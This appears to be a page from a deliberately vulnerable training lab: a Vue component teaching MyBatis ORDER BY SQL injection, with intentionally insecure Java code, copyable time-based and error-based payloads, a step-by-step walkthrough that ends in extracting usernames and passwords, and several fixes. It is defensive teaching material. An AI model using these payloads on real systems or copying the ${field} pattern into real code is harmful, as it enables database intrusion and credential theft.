<template>
  <vuln-template
    title="SQL注入 - MyBatis ORDER BY"
    subtitle="SQL Injection - MyBatis ORDER BY"
    level="高危"
    :icon="DatabaseOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>MyBatis ORDER BY注入</strong>是指在使用ORDER BY排序时,使用${}拼接导致SQL注入。
      </a-typography-paragraph>
      <a-typography-paragraph>
        MyBatis ORDER BY注入的特点：
      </a-typography-paragraph>
      <ul>
        <li>ORDER BY后不能使用#{}，因为会被当作字符串</li>
        <li>使用${}直接拼接导致SQL注入</li>
        <li>可以通过时间盲注或报错注入获取数据</li>
        <li>常见于动态排序功能</li>
        <li>需要使用白名单验证字段名</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的ORDER BY注入payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>id</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">正常排序字段</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">id,(select sleep(5))</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">时间盲注测试</span>
      </a-space>

      <a-typography-paragraph code copyable style="margin-top: 12px">id,(select extractvalue(1,concat(0x7e,database(),0x7e)))</a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">报错注入获取数据库名</span>
      </a-space>

      <a-alert
        message="ORDER BY必须使用白名单验证字段名，不能直接使用${}！"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <a-form :model="formState" @finish="handleSubmit" layout="vertical">
        <a-form-item
          label="排序字段"
          name="field"
          :rules="[{ required: true, message: '请输入排序字段' }]"
        >
          <a-input
            v-model:value="formState.field"
            size="large"
            placeholder="输入排序字段（如：id, username等）"
          />
        </a-form-item>

        <a-form-item>
          <a-space>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><play-circle-outlined /></template>
              执行测试
            </a-button>
            <a-button size="large" @click="handleReset">
              <template #icon><redo-outlined /></template>
              重置
            </a-button>
          </a-space>
        </a-form-item>
      </a-form>
    </template>

    <template #input-hint>
      <a-alert message="攻击示例流程" type="warning" show-icon style="margin-bottom: 12px;" />
      <p><strong>完整攻击流程：</strong></p>
      <ol style="padding-left: 20px; margin-bottom: 0; line-height: 2;">
        <li><strong>步骤1：</strong>测试注入点 - 输入 <a-typography-text code copyable>id,(select sleep(5))</a-typography-text>，如果响应延迟，说明存在注入</li>
        <li><strong>步骤2：</strong>获取数据库名 - 输入 <a-typography-text code copyable>id,(select extractvalue(1,concat(0x7e,database(),0x7e)))</a-typography-text></li>
        <li><strong>步骤3：</strong>获取表名 - 输入 <a-typography-text code copyable>id,(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))</a-typography-text></li>
        <li><strong>步骤4：</strong>获取列名 - 输入 <a-typography-text code copyable>id,(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e)))</a-typography-text></li>
        <li><strong>步骤5：</strong>获取数据 - 输入 <a-typography-text code copyable>id,(select extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)))</a-typography-text></li>
        <li><strong>步骤6：</strong>批量获取 - 使用limit子句逐条获取所有数据</li>
      </ol>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="color: #1890ff; margin: 0;">{{ result }}</pre>
      </div>
      <a-alert
        message="如果返回了多条数据、错误信息或响应延迟，说明存在ORDER BY注入漏洞。"
        type="info"
        show-icon
        style="margin-top: 16px"
      />
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>// Controller层
@RestController
@RequestMapping("/home/sqli/mybatis")
public class MyBatis {
    @RequestMapping("/orderby")
    public String orderBy(String field) {
        // 漏洞：直接将用户输入的field传递给Service，没有验证
        ArrayList&lt;Admin&gt; adminList = injectService.orderBy(field);
        // 返回结果...
    }
}

// DAO层 - 使用@Select注解
@Mapper
public interface InjectDao {
    // 漏洞：使用${field}直接拼接，不做转义
    @Select("select * from users order by ${field}")
    ArrayList&lt;Admin&gt; orderBy(@Param("field") String field);
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：MyBatis中使用${field}直接拼接SQL，${}不会进行转义，攻击者可以注入任意SQL语句。ORDER BY不能使用#{}（会被当作字符串），但也不能直接使用${}。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>白名单验证：</strong>只允许预定义的排序字段，使用白名单验证</li>
        <li><strong>字段映射：</strong>使用字段映射表，将用户输入映射到实际字段名</li>
        <li><strong>避免${}：</strong>ORDER BY场景不能使用#{}，但也不能直接使用${}</li>
        <li><strong>输入验证：</strong>严格验证排序字段，只允许字母、数字和下划线</li>
        <li><strong>默认排序：</strong>提供默认排序字段，避免用户直接控制</li>
        <li><strong>使用choose标签：</strong>在MyBatis XML中使用choose标签限制字段</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        @Select("select * from users order by ${field}")
        ArrayList&lt;Admin&gt; orderBy(@Param("field") String field);
// 攻击者可以输入: id,(select sleep(5))</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：Controller层白名单验证
        @RequestMapping("/orderby")
        public String orderBy(String field) {
            // 定义允许的排序字段
            String[] allowedFields = {"id", "username", "create_time"};
            boolean isValid = Arrays.asList(allowedFields).contains(field);
            
            if (!isValid) {
                field = "id"; // 默认排序
            }
            
            ArrayList&lt;Admin&gt; adminList = injectService.orderBy(field);
            // 返回结果...
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：使用MyBatis XML choose标签
        &lt;select id="orderBy" resultType="Admin"&gt;
            SELECT * FROM users ORDER BY 
            &lt;choose&gt;
                &lt;when test="field == 'id'"&gt;
                    id
                &lt;/when&gt;
                &lt;when test="field == 'username'"&gt;
                    username
                &lt;/when&gt;
                &lt;when test="field == 'create_time'"&gt;
                    create_time
                &lt;/when&gt;
                &lt;otherwise&gt;
                    id
                &lt;/otherwise&gt;
            &lt;/choose&gt;
&lt;/select&gt;</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：使用字段映射
        private static final Map&lt;String, String&gt; FIELD_MAP = new HashMap&lt;&gt;();
        static {
            FIELD_MAP.put("id", "id");
            FIELD_MAP.put("name", "username");
            FIELD_MAP.put("time", "create_time");
        }
        
        @RequestMapping("/orderby")
        public String orderBy(String field) {
            // 从映射表获取实际字段名
            String actualField = FIELD_MAP.getOrDefault(field, "id");
            ArrayList&lt;Admin&gt; adminList = injectService.orderBy(actualField);
            // 返回结果...
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：输入验证（正则表达式）
        private static final Pattern FIELD_PATTERN = Pattern.compile("^[a-zA-Z_][a-zA-Z0-9_]*$");
        
        @RequestMapping("/orderby")
        public String orderBy(String field) {
            // 验证字段名格式（只允许字母、数字、下划线，且以字母或下划线开头）
            if (!FIELD_PATTERN.matcher(field).matches()) {
                field = "id"; // 默认排序
            }
            
            // 进一步验证是否在允许列表中
            String[] allowedFields = {"id", "username", "create_time"};
            if (!Arrays.asList(allowedFields).contains(field)) {
                field = "id";
            }
            
            ArrayList&lt;Admin&gt; adminList = injectService.orderBy(field);
            // 返回结果...
}</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { DatabaseOutlined, PlayCircleOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `// Controller层
@RestController
@RequestMapping("/home/sqli/mybatis")
public class MyBatis {
    @RequestMapping("/orderby")
    public String orderBy(String field) {
        // 漏洞：直接将用户输入的field传递给Service，没有验证
        ArrayList<Admin> adminList = injectService.orderBy(field);
        // 返回结果...
    }
}

// DAO层 - 使用@Select注解
@Mapper
public interface InjectDao {
    // 漏洞：使用\${field}直接拼接，不做转义
    @Select("select * from users order by \${field}")
    ArrayList<Admin> orderBy(@Param("field") String field);
}`

const fixCode1 = `// 错误示例(易受攻击)
@Select("select * from users order by \${field}")
ArrayList<Admin> orderBy(@Param("field") String field);
// 攻击者可以输入: id,(select sleep(5))`

const fixCode2 = `// 正确示例1：Controller层白名单验证
@RequestMapping("/orderby")
public String orderBy(String field) {
    // 定义允许的排序字段
    String[] allowedFields = {"id", "username", "create_time"};
    boolean isValid = Arrays.asList(allowedFields).contains(field);
    
    if (!isValid) {
        field = "id"; // 默认排序
    }
    
    ArrayList<Admin> adminList = injectService.orderBy(field);
    // 返回结果...
}`

const fixCode3 = `// 正确示例2：使用MyBatis XML choose标签
<select id="orderBy" resultType="Admin">
    SELECT * FROM users ORDER BY 
    <choose>
        <when test="field == 'id'">
            id
        </when>
        <when test="field == 'username'">
            username
        </when>
        <when test="field == 'create_time'">
            create_time
        </when>
        <otherwise>
            id
        </otherwise>
    </choose>
</select>`

const fixCode4 = `// 正确示例3：使用字段映射
private static final Map<String, String> FIELD_MAP = new HashMap<>();
static {
    FIELD_MAP.put("id", "id");
    FIELD_MAP.put("name", "username");
    FIELD_MAP.put("time", "create_time");
}

@RequestMapping("/orderby")
public String orderBy(String field) {
    // 从映射表获取实际字段名
    String actualField = FIELD_MAP.getOrDefault(field, "id");
    ArrayList<Admin> adminList = injectService.orderBy(actualField);
    // 返回结果...
}`

const fixCode5 = `// 正确示例4：输入验证（正则表达式）
private static final Pattern FIELD_PATTERN = Pattern.compile("^[a-zA-Z_][a-zA-Z0-9_]*$");

@RequestMapping("/orderby")
public String orderBy(String field) {
    // 验证字段名格式（只允许字母、数字、下划线，且以字母或下划线开头）
    if (!FIELD_PATTERN.matcher(field).matches()) {
        field = "id"; // 默认排序
    }
    
    // 进一步验证是否在允许列表中
    String[] allowedFields = {"id", "username", "create_time"};
    if (!Arrays.asList(allowedFields).contains(field)) {
        field = "id";
    }
    
    ArrayList<Admin> adminList = injectService.orderBy(field);
    // 返回结果...
}`

const formState = reactive({
  field: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/sqli/mybatis/orderby', {
      params: { field: formState.field }
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.field = ''
  result.value = ''
}
</script>
